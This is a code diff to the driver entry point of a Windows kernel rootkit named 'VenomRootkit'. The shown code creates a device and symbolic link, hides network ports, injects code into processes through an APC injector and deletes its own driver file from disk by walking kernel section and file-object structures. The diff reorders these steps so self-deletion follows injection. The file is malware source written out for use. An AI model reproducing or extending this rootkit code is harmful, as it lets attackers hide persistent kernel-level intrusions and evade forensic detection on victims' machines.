@@ -6,18 +6,19 @@
 #include "Ioctl.h"
 #include "Venom.h"
 
+
 EXTERN_C NTSTATUS
 DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
 	UNREFERENCED_PARAMETER(registryPath);
 
 	auto status = STATUS_SUCCESS;
 	PDEVICE_OBJECT deviceObject = nullptr;
-	UNICODE_STRING symLink = RTL_CONSTANT_STRING(VENOM_SYMLINK);
+	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");
 
 	bool symLinkCreated = false;
 	do
 	{
-		UNICODE_STRING deviceName = RTL_CONSTANT_STRING(VENOM_DEVICE_NAME);
+		UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\VenomRootkit");
 		status = IoCreateDevice(driverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &deviceObject);
 		if (!NT_SUCCESS(status)) {
 			break;
@@ -48,17 +49,6 @@ DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
 	driverObject->MajorFunction[IRP_MJ_CREATE] = driverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
 	driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;
 
-	const auto ldrDataEntry = static_cast<PKLDR_DATA_TABLE_ENTRY>(driverObject->DriverSection);
-	const auto sectionPointer = static_cast<PSECTION>(ldrDataEntry->SectionPointer);
-	const auto controlArea = reinterpret_cast<PCONTROL_AREA>(sectionPointer->u1.ControlArea);
-	const auto fileObject = reinterpret_cast<PFILE_OBJECT>(static_cast<_EX_FAST_REF*>(controlArea->FilePointer.Object)->Value);
-
-	const auto fileDeleter = FileDeleter(fileObject);
-	status = fileDeleter.deleteFileFromDisk();
-	if(NT_SUCCESS(status)){
-		return status;
-	}
-
 	status = PortHider::hide();
 	if (!NT_SUCCESS(status)) {
 		return status;
@@ -70,6 +60,16 @@ DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
 	status = apcInjector.inject();
 
 	if (!NT_SUCCESS(status)) {
+		return status;
+	}
+
+	const auto ldrDataEntry = static_cast<PKLDR_DATA_TABLE_ENTRY>(driverObject->DriverSection);
+	const auto sectionPointer = static_cast<PSECTION>(ldrDataEntry->SectionPointer);
+	const auto controlArea = sectionPointer->u1.ControlArea; 
+	const auto fileObject = reinterpret_cast<PFILE_OBJECT>(reinterpret_cast<uintptr_t>(controlArea->FilePointer.Object) & PTR_ALIGN);
+	const auto fileDeleter = FileDeleter(fileObject);
+	status = fileDeleter.deleteFileFromDisk();
+	if (NT_SUCCESS(status)) {
 		return status;
 	}
 
